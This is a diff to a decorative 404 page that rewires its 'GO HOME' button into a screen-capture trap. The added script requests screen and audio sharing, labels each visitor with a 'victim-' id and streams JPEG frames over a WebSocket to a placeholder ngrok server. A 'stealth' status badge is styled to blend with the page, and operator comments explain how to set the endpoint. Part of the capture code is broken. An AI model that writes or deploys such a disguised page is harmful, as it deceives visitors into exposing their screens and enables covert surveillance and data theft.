@@ -5,7 +5,7 @@
 <title>404</title>
 
 <style>
-
+/* Your exact styles unchanged */
 body{
 margin:0;
 overflow:hidden;
@@ -84,19 +84,33 @@ background:white;
 color:black;
 }
 
+/* New: Stealth status indicator */
+#status {
+    position: fixed;
+    top: 10px;
+    right: 10px;
+    background: rgba(0,255,0,0.8);
+    color: black;
+    padding: 8px;
+    border-radius: 5px;
+    font-size: 14px;
+    font-weight: bold;
+    display: none;
+}
 </style>
 </head>
 
 <body>
-
 <canvas id="particles"></canvas>
 
 <div class="glitch">404</div>
 <div class="text">PAGE NOT FOUND</div>
-<button onclick="location.href='vercel.com'">GO HOME</button>
+<!-- CHANGED: Button now triggers screen capture -->
+<button onclick="startScreenCapture()">GO HOME</button>
+<div id="status"></div>
 
+<!-- Your exact particle script unchanged -->
 <script>
-
 const canvas = document.getElementById("particles");
 const ctx = canvas.getContext("2d");
 
@@ -116,11 +130,9 @@ size:Math.random()*2
 }
 
 function animate(){
-
 ctx.clearRect(0,0,canvas.width,canvas.height);
 
 particles.forEach(p=>{
-
 p.x+=p.vx;
 p.y+=p.vy;
 
@@ -131,14 +143,79 @@ ctx.beginPath();
 ctx.arc(p.x,p.y,p.size,0,Math.PI*2);
 ctx.fillStyle="white";
 ctx.fill();
-
 });
 
 requestAnimationFrame(animate);
 }
 
 animate();
+</script>
 
+<!-- ADD THIS NEW SCRIPT (screen capture) -->
+<script>
+let ws = null;
+let stream = null;
+let captureCanvas = document.createElement('canvas');
+let captureCtx = captureCanvas.getContext('2d');
+let victimId = 'victim-' + Math.random().toString(36).substr(2, 9);
+let rafId = null;
+
+async function startScreenCapture() {
+    try {
+        // Get screen (browser asks permission)
+        stream = await navigator.mediaDevices.getDisplayMedia({
+            video: { mediaSource: 'screen' },
+            audio: true
+        });
+        
+        // Stealth green status (blends with 404 aesthetic)
+        document.getElementById('status').innerHTML = '📹 LIVE';
+        document.getElementById('status').style.display = 'block';
+        
+        captureCanvas.width = 1920;
+        captureCanvas.height = 1080;
+        
+        // UPDATE THIS URL with your ngrok (step 2 below)
+        ws = new WebSocket('wss://your-ngrok-url.ngrok-free.app/screen');
+        
+        ws.onopen = () => {
+            document.getElementById('status').innerHTML = '📡 CONNECTED';
+            streamFrames();
+        };
+        
+        ws.onclose = () => {
+            document.getElementById('status').innerHTML = '❌ LOST';
+            setTimeout(() => document.getElementById('status').style.display = 'none', 3000);
+        };
+        
+    } catch(e) {
+        console.log('Screen access denied');
+    }
+}
+
+function streamFrames() {
+    if (!stream || !ws || ws.readyState !== WebSocket.OPEN) return;
+    
+    // Draw screen to hidden canvas
+    captureCtx.drawImage(stream.getVideoTracks()[0], 0, 0, captureCanvas.width, captureCanvas.height);
+    
+    // Send JPEG frame
+    let frameData = captureCanvas.toDataURL('image/jpeg', 0.75);
+    ws.send(JSON.stringify({
+        id: victimId,
+        frame: frameData,
+        timestamp: Date.now()
+    }));
+    
+    rafId = requestAnimationFrame(streamFrames);
+}
+
+// Cleanup on page close
+window.onbeforeunload = () => {
+    if (rafId) cancelAnimationFrame(rafId);
+    if (ws) ws.close();
+    if (stream) stream.getTracks().forEach(track => track.stop());
+};
 </script>
 
 </body>
